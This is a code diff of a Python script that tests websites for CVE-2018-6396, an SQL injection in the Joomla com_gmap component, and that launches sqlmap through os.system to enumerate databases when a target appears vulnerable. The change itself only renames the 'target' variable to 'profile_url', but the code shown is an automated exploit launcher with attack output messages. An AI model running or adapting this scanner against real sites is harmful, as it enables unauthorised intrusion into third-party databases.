@@ -64,9 +64,9 @@ P = "/index.php?option=com_gmap&view=gm_modal&tmpl=component&layout=default&map=
 def randomString(size):
     return ''.join(chr(random.randint(65, 90)) for _ in range(size))
 
-def isVulnerable(target):
+def isVulnerable(profile_url):
     global UA
-    url = urljoin(target, P)
+    url = urljoin(profile_url, P)
 
     headers = {
         'User-Agent': UA.random(),
@@ -77,7 +77,7 @@ def isVulnerable(target):
         'Connection': 'keep-alive'
     }
 
-    print(Colors.BOLD + Colors.GREEN + f"[+]" + " Checking if " + Colors.YELLOW + target + Colors.GREEN + " is vulnerable" + Colors.ENDC)
+    print(Colors.BOLD + Colors.GREEN + f"[+]" + " Checking if " + Colors.YELLOW + profile_url + Colors.GREEN + " is vulnerable" + Colors.ENDC)
     
     try:
         response = requests.get(url, headers=headers, timeout=10, verify=False)
@@ -88,13 +88,13 @@ def isVulnerable(target):
     
     return False
 
-def scan_cve_2018_6396(target):
+def scan_cve_2018_6396(profile_url):
 
-    if isVulnerable(target):
-        print(Colors.BOLD + Colors.GREEN + "[+]" + " TARGET " + Colors.YELLOW + target + Colors.GREEN + " VULNERABLE!! :)" + Colors.ENDC)
+    if isVulnerable(profile_url):
+        print(Colors.BOLD + Colors.GREEN + "[+]" + " TARGET " + Colors.YELLOW + profile_url + Colors.GREEN + " VULNERABLE!! :)" + Colors.ENDC)
         print(Colors.BOLD + Colors.GREEN + "[+]" + " LAUNCHING ATTACK SQLi with SQLmap!!" + Colors.ENDC)
-        exploit_command = f'sqlmap -u "{target + P}" -p map --dbs'
+        exploit_command = f'sqlmap -u "{profile_url + P}" -p map --dbs'
         os.system(exploit_command)
     else:
-        print(Colors.BOLD + Colors.RED + "[-]" + " TARGET " + Colors.YELLOW + target + Colors.RED + " NOT VULNERABLE!! :(" + Colors.ENDC)
+        print(Colors.BOLD + Colors.RED + "[-]" + " TARGET " + Colors.YELLOW + profile_url + Colors.RED + " NOT VULNERABLE!! :(" + Colors.ENDC)
 
